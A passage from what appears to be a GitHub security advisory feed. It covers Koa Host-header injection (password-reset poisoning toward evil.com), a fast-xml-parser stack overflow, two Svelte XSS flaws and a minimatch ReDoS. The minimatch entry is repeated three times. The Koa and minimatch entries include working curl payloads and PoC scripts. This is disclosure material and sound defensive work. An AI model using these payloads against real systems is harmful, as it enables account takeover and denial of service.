        protocol: ctx.protocol
      }
    };
  }
});

app.listen(3000, () =&gt; console.log('Server on http://localhost:3000'));
</code></pre>
<h3 id="exploit">Exploit</h3>
<pre><code class="language-bash">curl -H "Host: evil.com:fake@localhost:3000" http://localhost:3000/forgot-password
</code></pre>
<h3 id="result">Result</h3>
<pre><code class="language-json">{
  "message": "Password reset link generated",
  "resetUrl": "http://evil.com/reset?token=abc123securtoken",
  "debug": {
    "rawHost": "evil.com:fake@localhost:3000",
    "parsedHostname": "evil.com",
    "origin": "http://evil.com:fake@localhost:3000",
    "protocol": "http"
  }
}
</code></pre>
<p>The password reset URL points to <code>evil.com</code> instead of the legitimate server. In a real attack:</p>
<ol>
<li>Attacker requests password reset for victim's email with malicious Host header</li>
<li>Server generates reset link using <code>ctx.hostname</code> → <code>https://evil.com/reset?token=SECRET</code></li>
<li>Victim receives email with poisoned link</li>
<li>Victim clicks link, token is sent to attacker's server</li>
<li>Attacker uses token to reset victim's password</li>
</ol>
<h3 id="additional-test-cases">Additional Test Cases</h3>
<pre><code class="language-bash"># Basic injection
curl -H "Host: evil.com:x@legitimate.com" http://localhost:3000/forgot-password
# Result: hostname = "evil.com"

# With port preservation attempt
curl -H "Host: evil.com:443@legitimate.com:3000" http://localhost:3000/forgot-password  
# Result: hostname = "evil.com"

# Unicode/encoded variations
curl -H "Host: evil.com:x%40legitimate.com" http://localhost:3000/forgot-password
# Result: hostname = "evil.com"
</code></pre>
<h3 id="deployment-consideration">Deployment Consideration</h3>
<p>For this attack to succeed in production, the malicious Host header must reach the Koa application. This occurs when:</p>
<ol>
<li><strong>No reverse proxy</strong> - Application directly exposed to internet</li>
<li><strong>Misconfigured proxy</strong> - Proxy doesn't override/validate Host header</li>
<li><strong>Proxy trust enabled</strong> (<code>app.proxy = true</code>) - <code>X-Forwarded-Host</code> can be injected</li>
<li><strong>Default virtual host</strong> - Server is the catch-all for unrecognized Host headers</li>
</ol>
<h2 id="impact">Impact</h2>
<h3 id="vulnerability-type">Vulnerability Type</h3>
<ul>
<li>CWE-20: Improper Input Validation</li>
<li>CWE-644: Improper Neutralization of HTTP Headers for Scripting Syntax</li>
</ul>
<h3 id="attack-scenarios">Attack Scenarios</h3>
<p><strong>1. Password Reset Poisoning (High Severity)</strong></p>
<ul>
<li>Attacker hijacks password reset tokens by poisoning reset URLs</li>
<li>Requires victim to click link in email</li>
<li>Results in account takeover</li>
</ul>
<p><strong>2. Email Verification Bypass</strong></p>
<ul>
<li>Attacker poisons email verification links</li>
<li>Can verify attacker-controlled email on victim accounts</li>
</ul>
<p><strong>3. OAuth/SSO Callback Manipulation</strong></p>
<ul>
<li>Applications using <code>ctx.hostname</code> for OAuth redirect URIs</li>
<li>Attacker redirects OAuth callbacks to malicious server</li>
<li>Results in token theft</li>
</ul>
<p><strong>4. Web Cache Poisoning</strong></p>
<ul>
<li>If responses are cached without Host in cache key</li>
<li>Poisoned URLs served to all users</li>
<li>Persistent XSS/phishing via cached responses</li>
</ul>
<p><strong>5. Server-Side Request Forgery (SSRF)</strong></p>
<ul>
<li>Internal routing decisions based on <code>ctx.hostname</code></li>
<li>Attacker manipulates which backend receives requests</li>
</ul>
<h3 id="who-is-impacted">Who Is Impacted</h3>
<ul>
<li><strong>Direct impact</strong>: Any Koa application using <code>ctx.hostname</code> or <code>ctx.origin</code> for URL generation without additional validation</li>
<li><strong>Common patterns</strong>: Password reset, email verification, webhook URL generation, multi-tenant routing, OAuth implementations</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/koajs/koa/security/advisories/GHSA-7gcc-r8m5-44qm">https://github.com/koajs/koa/security/advisories/GHSA-7gcc-r8m5-44qm</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27959">https://nvd.nist.gov/vuln/detail/CVE-2026-27959</a></li>
<li><a href="https://github.com/koajs/koa/commit/55ab9bab044ead4e82c70a30a4f9dc0fc9c1b6df">https://github.com/koajs/koa/commit/55ab9bab044ead4e82c70a30a4f9dc0fc9c1b6df</a></li>
<li><a href="https://github.com/koajs/koa/commit/b76ddc01fdb703e51652b0fd131d16394cadcfeb">https://github.com/koajs/koa/commit/b76ddc01fdb703e51652b0fd131d16394cadcfeb</a></li>
<li><a href="https://github.com/advisories/GHSA-7gcc-r8m5-44qm">https://github.com/advisories/GHSA-7gcc-r8m5-44qm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7gcc-r8m5-44qm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-02-26T22:42:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[fast-xml-parser] fast-xml-parser has stack overflow in XMLBuilder with preserveOrder]]></title>
        <id>https://github.com/advisories/GHSA-fj3w-jwp8-x2g3</id>
        <link href="https://github.com/advisories/GHSA-fj3w-jwp8-x2g3"/>
        <updated>2026-02-26T22:33:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Application crashes with stack overflow when user use XML builder with <code>prserveOrder:true</code> for following or similar input:</p>
<pre><code>[{
    'foo': [
        { 'bar': [{ '@_V': 'baz' }] }
    ]
}]
</code></pre>
<p>Cause: <code>arrToStr</code> was not validating if the input is an array or a string and treating all non-array values as text content.
<em>What kind of vulnerability is it? Who is impacted?</em></p>
<h3 id="patches">Patches</h3>
<p>Yes, in 5.3.8.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Use XML builder with <code>preserveOrder:false</code> or check the input data before passing to builder.</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/NaturalIntelligence/fast-xml-parser/pull/791"><em>Are there any links users can visit to find out more?</em></a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-fj3w-jwp8-x2g3">https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-fj3w-jwp8-x2g3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27942">https://nvd.nist.gov/vuln/detail/CVE-2026-27942</a></li>
<li><a href="https://github.com/NaturalIntelligence/fast-xml-parser/pull/791">https://github.com/NaturalIntelligence/fast-xml-parser/pull/791</a></li>
<li><a href="https://github.com/NaturalIntelligence/fast-xml-parser/commit/c13a961910f14986295dd28484eee830fa1a0e8a">https://github.com/NaturalIntelligence/fast-xml-parser/commit/c13a961910f14986295dd28484eee830fa1a0e8a</a></li>
<li><a href="https://github.com/advisories/GHSA-fj3w-jwp8-x2g3">https://github.com/advisories/GHSA-fj3w-jwp8-x2g3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fj3w-jwp8-x2g3</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-02-26T22:33:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[svelte] Svelte: XSS via HTML Comment Injection in SSR Error Boundary Hydration Markers]]></title>
        <id>https://github.com/advisories/GHSA-qgvg-pr8v-6rr3</id>
        <link href="https://github.com/advisories/GHSA-qgvg-pr8v-6rr3"/>
        <updated>2026-02-26T22:25:47.000Z</updated>
        <content type="html"><![CDATA[<p>Errors from <code>transformError</code> were not correctly escaped prior to being embedded in the HTML output, causing potential HTML injection and XSS if attacker-controlled content is returned from <code>transformError</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sveltejs/svelte/security/advisories/GHSA-qgvg-pr8v-6rr3">https://github.com/sveltejs/svelte/security/advisories/GHSA-qgvg-pr8v-6rr3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27902">https://nvd.nist.gov/vuln/detail/CVE-2026-27902</a></li>
<li><a href="https://github.com/sveltejs/svelte/commit/0298e979371bb583855c9810db79a70a551d22b9">https://github.com/sveltejs/svelte/commit/0298e979371bb583855c9810db79a70a551d22b9</a></li>
<li><a href="https://github.com/sveltejs/svelte/releases/tag/svelte@5.53.5">https://github.com/sveltejs/svelte/releases/tag/svelte@5.53.5</a></li>
<li><a href="https://github.com/advisories/GHSA-qgvg-pr8v-6rr3">https://github.com/advisories/GHSA-qgvg-pr8v-6rr3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qgvg-pr8v-6rr3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-02-26T22:25:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[svelte] Svelte vulnerable to XSS during SSR with contenteditable `bind:innerText` and `bind:textContent`]]></title>
        <id>https://github.com/advisories/GHSA-phwv-c562-gvmh</id>
        <link href="https://github.com/advisories/GHSA-phwv-c562-gvmh"/>
        <updated>2026-02-26T22:24:57.000Z</updated>
        <content type="html"><![CDATA[<p>The contents of <code>bind:innerText</code> and <code>bind:textContent</code> on <code>contenteditable</code> elements were not properly escaped. This could enable HTML injection and Cross-site Scripting (XSS) if rendering untrusted data as the binding's initial value on the server.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sveltejs/svelte/security/advisories/GHSA-phwv-c562-gvmh">https://github.com/sveltejs/svelte/security/advisories/GHSA-phwv-c562-gvmh</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27901">https://nvd.nist.gov/vuln/detail/CVE-2026-27901</a></li>
<li><a href="https://github.com/sveltejs/svelte/commit/0df5abcae223058ceb95491470372065fb87951d">https://github.com/sveltejs/svelte/commit/0df5abcae223058ceb95491470372065fb87951d</a></li>
<li><a href="https://github.com/sveltejs/svelte/releases/tag/svelte@5.53.5">https://github.com/sveltejs/svelte/releases/tag/svelte@5.53.5</a></li>
<li><a href="https://github.com/advisories/GHSA-phwv-c562-gvmh">https://github.com/advisories/GHSA-phwv-c562-gvmh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-phwv-c562-gvmh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-02-26T22:24:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[minimatch] minimatch has ReDoS: matchOne() combinatorial backtracking via multiple non-adjacent GLOBSTAR segments]]></title>
        <id>https://github.com/advisories/GHSA-7r86-cg39-jmmj</id>
        <link href="https://github.com/advisories/GHSA-7r86-cg39-jmmj"/>
        <updated>2026-02-26T22:10:20.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>matchOne()</code> performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent <code>**</code> (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where <code>n</code> is the number of path segments and <code>k</code> is the number of globstars. With k=11 and n=30, a call to the default <code>minimatch()</code> API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior.</p>
<hr>
<h3 id="details">Details</h3>
<p>The vulnerable loop is in <code>matchOne()</code> at <a href="https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L960"><code>src/index.ts#L960</code></a>:</p>
<pre><code class="language-typescript">while (fr &lt; fl) {
  ..
  if (this.matchOne(file.slice(fr), pattern.slice(pr), partial)) {
    ..
    return true
  }
  ..
  fr++
}
</code></pre>
<p>When a GLOBSTAR is encountered, the function tries to match the remaining pattern against every suffix of the remaining file segments. Each <code>**</code> multiplies the number of recursive calls by the number of remaining segments. With k non-adjacent globstars and n file segments, the total number of calls is C(n, k).</p>
<p>There is no depth counter, visited-state cache, or budget limit applied to this recursion. The call tree is fully explored before returning <code>false</code> on a non-matching input.</p>
<p>Measured timing with n=30 path segments:</p>
<table>
<thead>
<tr>
<th>k (globstars)</th>
<th>Pattern size</th>
<th>Time</th>
</tr>
</thead>
<tbody><tr>
<td>7</td>
<td>36 bytes</td>
<td>~154ms</td>
</tr>
<tr>
<td>9</td>
<td>46 bytes</td>
<td>~1.2s</td>
</tr>
<tr>
<td>11</td>
<td>56 bytes</td>
<td>~5.4s</td>
</tr>
<tr>
<td>12</td>
<td>61 bytes</td>
<td>~9.7s</td>
</tr>
<tr>
<td>13</td>
<td>66 bytes</td>
<td>~15.9s</td>
</tr>
</tbody></table>
<hr>
<h3 id="poc">PoC</h3>
<p>Tested on <a href="mailto:minimatch@10.2.2">minimatch@10.2.2</a>, Node.js 20.</p>
<p><strong>Step 1 -- inline script</strong></p>
<pre><code class="language-javascript">import { minimatch } from 'minimatch'

// k=9 globstars, n=30 path segments
// pattern: 46 bytes, default options
const pattern = '**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/b'
const path    = 'a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a'

const start = Date.now()
minimatch(path, pattern)
console.log(Date.now() - start + 'ms') // ~1200ms
</code></pre>
<p>To scale the effect, increase k:</p>
<pre><code class="language-javascript">// k=11 -&gt; ~5.4s, k=13 -&gt; ~15.9s
const k = 11
const pattern = Array.from({ length: k }, () =&gt; '**/a').join('/') + '/b'
const path    = Array(30).fill('a').join('/')
minimatch(path, pattern)
</code></pre>
<p>No special options are required. This reproduces with the default <code>minimatch()</code> call.</p>
<p><strong>Step 2 -- HTTP server (event loop starvation proof)</strong></p>
<p>The following server demonstrates the event loop starvation effect. It is a minimal harness, not a claim that this exact deployment pattern is common:</p>
<pre><code class="language-javascript">// poc1-server.mjs
import http from 'node:http'
import { URL } from 'node:url'
import { minimatch } from 'minimatch'

const PORT = 3000

const server = http.createServer((req, res) =&gt; {
  const url = new URL(req.url, `http://localhost:${PORT}`)
  if (url.pathname !== '/match') { res.writeHead(404); res.end(); return }

  const pattern = url.searchParams.get('pattern') ?? ''
  const path    = url.searchParams.get('path') ?? ''

  const start  = process.hrtime.bigint()
  const result = minimatch(path, pattern)
  const ms     = Number(process.hrtime.bigint() - start) / 1e6

  res.writeHead(200, { 'Content-Type': 'application/json' })
  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n')
})

server.listen(PORT)
</code></pre>
<p>Terminal 1 -- start the server:</p>
<pre><code>node poc1-server.mjs
</code></pre>
<p>Terminal 2 -- send the attack request (k=11, ~5s stall) and immediately return to shell:</p>
<pre><code>curl "http://localhost:3000/match?pattern=**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2Fb&amp;path=a%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa" &amp;
</code></pre>
<p>Terminal 3 -- while the attack is in-flight, send a benign request:</p>
<pre><code>curl -w "\ntime_total: %{time_total}s\n" "http://localhost:3000/match?pattern=**%2Fy%2Fz&amp;path=x%2Fy%2Fz"
</code></pre>
<p><strong>Observed output (Terminal 3):</strong></p>
<pre><code>{"result":true,"ms":"0"}

time_total: 4.132709s
</code></pre>
<p>The server reports <code>"ms":"0"</code> -- the legitimate request itself takes zero processing time. The 4+ second <code>time_total</code> is entirely time spent waiting for the event loop to be released by the attack request. Every concurrent user is blocked for the full duration of each attack call. Repeating the benign request while no attack is in-flight confirms the baseline:</p>
<pre><code>{"result":true,"ms":"0"}

time_total: 0.001599s
</code></pre>
<hr>
<h3 id="impact">Impact</h3>
<p>Any application where an attacker can influence the glob pattern passed to <code>minimatch()</code> is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/isaacs/minimatch/security/advisories/GHSA-7r86-cg39-jmmj">https://github.com/isaacs/minimatch/security/advisories/GHSA-7r86-cg39-jmmj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27903">https://nvd.nist.gov/vuln/detail/CVE-2026-27903</a></li>
<li><a href="https://github.com/isaacs/minimatch/commit/0bf499aa45f5059b56809cc3b75ff3eafeb8d748">https://github.com/isaacs/minimatch/commit/0bf499aa45f5059b56809cc3b75ff3eafeb8d748</a></li>
<li><a href="https://github.com/advisories/GHSA-7r86-cg39-jmmj">https://github.com/advisories/GHSA-7r86-cg39-jmmj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7r86-cg39-jmmj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-02-26T22:10:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[minimatch] minimatch has ReDoS: matchOne() combinatorial backtracking via multiple non-adjacent GLOBSTAR segments]]></title>
        <id>https://github.com/advisories/GHSA-7r86-cg39-jmmj</id>
        <link href="https://github.com/advisories/GHSA-7r86-cg39-jmmj"/>
        <updated>2026-02-26T22:10:20.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>matchOne()</code> performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent <code>**</code> (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where <code>n</code> is the number of path segments and <code>k</code> is the number of globstars. With k=11 and n=30, a call to the default <code>minimatch()</code> API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior.</p>
<hr>
<h3 id="details">Details</h3>
<p>The vulnerable loop is in <code>matchOne()</code> at <a href="https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L960"><code>src/index.ts#L960</code></a>:</p>
<pre><code class="language-typescript">while (fr &lt; fl) {
  ..
  if (this.matchOne(file.slice(fr), pattern.slice(pr), partial)) {
    ..
    return true
  }
  ..
  fr++
}
</code></pre>
<p>When a GLOBSTAR is encountered, the function tries to match the remaining pattern against every suffix of the remaining file segments. Each <code>**</code> multiplies the number of recursive calls by the number of remaining segments. With k non-adjacent globstars and n file segments, the total number of calls is C(n, k).</p>
<p>There is no depth counter, visited-state cache, or budget limit applied to this recursion. The call tree is fully explored before returning <code>false</code> on a non-matching input.</p>
<p>Measured timing with n=30 path segments:</p>
<table>
<thead>
<tr>
<th>k (globstars)</th>
<th>Pattern size</th>
<th>Time</th>
</tr>
</thead>
<tbody><tr>
<td>7</td>
<td>36 bytes</td>
<td>~154ms</td>
</tr>
<tr>
<td>9</td>
<td>46 bytes</td>
<td>~1.2s</td>
</tr>
<tr>
<td>11</td>
<td>56 bytes</td>
<td>~5.4s</td>
</tr>
<tr>
<td>12</td>
<td>61 bytes</td>
<td>~9.7s</td>
</tr>
<tr>
<td>13</td>
<td>66 bytes</td>
<td>~15.9s</td>
</tr>
</tbody></table>
<hr>
<h3 id="poc">PoC</h3>
<p>Tested on <a href="mailto:minimatch@10.2.2">minimatch@10.2.2</a>, Node.js 20.</p>
<p><strong>Step 1 -- inline script</strong></p>
<pre><code class="language-javascript">import { minimatch } from 'minimatch'

// k=9 globstars, n=30 path segments
// pattern: 46 bytes, default options
const pattern = '**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/b'
const path    = 'a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a'

const start = Date.now()
minimatch(path, pattern)
console.log(Date.now() - start + 'ms') // ~1200ms
</code></pre>
<p>To scale the effect, increase k:</p>
<pre><code class="language-javascript">// k=11 -&gt; ~5.4s, k=13 -&gt; ~15.9s
const k = 11
const pattern = Array.from({ length: k }, () =&gt; '**/a').join('/') + '/b'
const path    = Array(30).fill('a').join('/')
minimatch(path, pattern)
</code></pre>
<p>No special options are required. This reproduces with the default <code>minimatch()</code> call.</p>
<p><strong>Step 2 -- HTTP server (event loop starvation proof)</strong></p>
<p>The following server demonstrates the event loop starvation effect. It is a minimal harness, not a claim that this exact deployment pattern is common:</p>
<pre><code class="language-javascript">// poc1-server.mjs
import http from 'node:http'
import { URL } from 'node:url'
import { minimatch } from 'minimatch'

const PORT = 3000

const server = http.createServer((req, res) =&gt; {
  const url = new URL(req.url, `http://localhost:${PORT}`)
  if (url.pathname !== '/match') { res.writeHead(404); res.end(); return }

  const pattern = url.searchParams.get('pattern') ?? ''
  const path    = url.searchParams.get('path') ?? ''

  const start  = process.hrtime.bigint()
  const result = minimatch(path, pattern)
  const ms     = Number(process.hrtime.bigint() - start) / 1e6

  res.writeHead(200, { 'Content-Type': 'application/json' })
  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n')
})

server.listen(PORT)
</code></pre>
<p>Terminal 1 -- start the server:</p>
<pre><code>node poc1-server.mjs
</code></pre>
<p>Terminal 2 -- send the attack request (k=11, ~5s stall) and immediately return to shell:</p>
<pre><code>curl "http://localhost:3000/match?pattern=**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2Fb&amp;path=a%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa" &amp;
</code></pre>
<p>Terminal 3 -- while the attack is in-flight, send a benign request:</p>
<pre><code>curl -w "\ntime_total: %{time_total}s\n" "http://localhost:3000/match?pattern=**%2Fy%2Fz&amp;path=x%2Fy%2Fz"
</code></pre>
<p><strong>Observed output (Terminal 3):</strong></p>
<pre><code>{"result":true,"ms":"0"}

time_total: 4.132709s
</code></pre>
<p>The server reports <code>"ms":"0"</code> -- the legitimate request itself takes zero processing time. The 4+ second <code>time_total</code> is entirely time spent waiting for the event loop to be released by the attack request. Every concurrent user is blocked for the full duration of each attack call. Repeating the benign request while no attack is in-flight confirms the baseline:</p>
<pre><code>{"result":true,"ms":"0"}

time_total: 0.001599s
</code></pre>
<hr>
<h3 id="impact">Impact</h3>
<p>Any application where an attacker can influence the glob pattern passed to <code>minimatch()</code> is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/isaacs/minimatch/security/advisories/GHSA-7r86-cg39-jmmj">https://github.com/isaacs/minimatch/security/advisories/GHSA-7r86-cg39-jmmj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27903">https://nvd.nist.gov/vuln/detail/CVE-2026-27903</a></li>
<li><a href="https://github.com/isaacs/minimatch/commit/0bf499aa45f5059b56809cc3b75ff3eafeb8d748">https://github.com/isaacs/minimatch/commit/0bf499aa45f5059b56809cc3b75ff3eafeb8d748</a></li>
<li><a href="https://github.com/advisories/GHSA-7r86-cg39-jmmj">https://github.com/advisories/GHSA-7r86-cg39-jmmj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7r86-cg39-jmmj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-02-26T22:10:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[minimatch] minimatch has ReDoS: matchOne() combinatorial backtracking via multiple non-adjacent GLOBSTAR segments]]></title>
        <id>https://github.com/advisories/GHSA-7r86-cg39-jmmj</id>
        <link href="https://github.com/advisories/GHSA-7r86-cg39-jmmj"/>
        <updated>2026-02-26T22:10:20.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>matchOne()</code> performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent <code>**</code> (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where <code>n</code> is the number of path segments and <code>k</code> is the number of globstars. With k=11 and n=30, a call to the default <code>minimatch()</code> API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior.</p>
<hr>
<h3 id="details">Details</h3>
<p>The vulnerable loop is in <code>matchOne()</code> at <a href="https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L960"><code>src/index.ts#L960</code></a>:</p>
<pre><code class="language-typescript">while (fr &lt; fl) {
  ..
  if (this.matchOne(file.slice(fr), pattern.slice(pr), partial)) {
    ..
    return true
  }
  ..
  fr++
}
</code></pre>
<p>When a GLOBSTAR is encountered, the function tries to match the remaining pattern against every suffix of the remaining file segments. Each <code>**</code> multiplies the number of recursive calls by the number of remaining segments. With k non-adjacent globstars and n file segments, the total number of calls is C(n, k).</p>
<p>There is no depth counter, visited-state cache, or budget limit applied to this recursion. The call tree is fully explored before returning <code>false</code> on a non-matching input.</p>
<p>Measured timing with n=30 path segments:</p>
<table>
<thead>
<tr>
<th>k (globstars)</th>
<th>Pattern size</th>
<th>Time</th>
</tr>
</thead>
<tbody><tr>
<td>7</td>
<td>36 bytes</td>
<td>~154ms</td>
</tr>
<tr>
<td>9</td>
<td>46 bytes</td>
<td>~1.2s</td>
</tr>
<tr>
<td>11</td>
<td>56 bytes</td>
<td>~5.4s</td>
</tr>
<tr>
<td>12</td>
<td>61 bytes</td>
<td>~9.7s</td>
</tr>
<tr>
<td>13</td>
<td>66 bytes</td>
<td>~15.9s</td>
</tr>
</tbody></table>
<hr>
<h3 id="poc">PoC</h3>
<p>Tested on <a href="mailto:minimatch@10.2.2">minimatch@10.2.2</a>, Node.js 20.</p>
<p><strong>Step 1 -- inline script</strong></p>
<pre><code class="language-javascript">import { minimatch } from 'minimatch'

// k=9 globstars, n=30 path segments
// pattern: 46 bytes, default options
const pattern = '**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/b'
const path    = 'a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a'

const start = Date.now()
minimatch(path, pattern)
console.log(Date.now() - start + 'ms') // ~1200ms
</code></pre>
<p>To scale the effect, increase k:</p>
<pre><code class="language-javascript">// k=11 -&gt; ~5.4s, k=13 -&gt; ~15.9s
const k = 11
const pattern = Array.from({ length: k }, () =&gt; '**/a').join('/') + '/b'
const path    = Array(30).fill('a').join('/')
minimatch(path, pattern)
</code></pre>
<p>No special options are required. This reproduces with the default <code>minimatch()</code> call.</p>
<p><strong>Step 2 -- HTTP server (event loop starvation proof)</strong></p>
<p>The following server demonstrates the event loop starvation effect. It is a minimal harness, not a claim that this exact deployment pattern is common:</p>
<pre><code class="language-javascript">// poc1-server.mjs
import http from 'node:http'
import { URL } from 'node:url'
import { minimatch } from 'minimatch'

const PORT = 3000

const server = http.createServer((req, res) =&gt; {
  const url = new URL(req.url, `http://localhost:${PORT}`)
  if (url.pathname !== '/match') { res.writeHead(404); res.end(); return }

  const pattern = url.searchParams.get('pattern') ?? ''
  const path    = url.searchParams.get('path') ?? ''

  const start  = process.hrtime.bigint()
  const result = minimatch(path, pattern)
  const ms     = Number(process.hrtime.bigint() - start) / 1e6

  res.writeHead(200, { 'Content-Type': 'application/json' })
  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n')
})

server.listen(PORT)
</code></pre>
<p>Terminal 1 -- start the server:</p>
<pre><code>node poc1-server.mjs
</code></pre>
<p>Terminal 2 -- send the attack request (k=11, ~5s stall) and immediately return to shell:</p>
<pre><code>curl "http://localhost:3000/match?pattern=**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2Fb&amp;path=a%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa" &amp;
</code></pre>
<p>Terminal 3 -- while the attack is in-flight, send a benign request:</p>
<pre><code>curl -w "\ntime_total: %{time_total}s\n" "http://localhost:3000/match?pattern=**%2Fy%2Fz&amp;path=x%2Fy%2Fz"
</code></pre>
<p><strong>Observed output (Terminal 3):</strong></p>
<pre><code>{"result":true,"ms":"0"}

time_total: 4.132709s
</code></pre>
<p>The server reports <code>"ms":"0"</code> -- the legitimate request itself takes zero processing time. The 4+ second <code>time_total</code> is entirely time spent waiting for the event loop to be released by the attack request. Every concurrent user is blocked for the full duration of each attack call. Repeating the benign request while no attack is in-flight confirms the baseline:</p>
<pre><code>{"result":true,"ms":"0"}

time_total: 0.001599s
</code></pre>
<hr>
<h3 id="impact">Impact</h3>
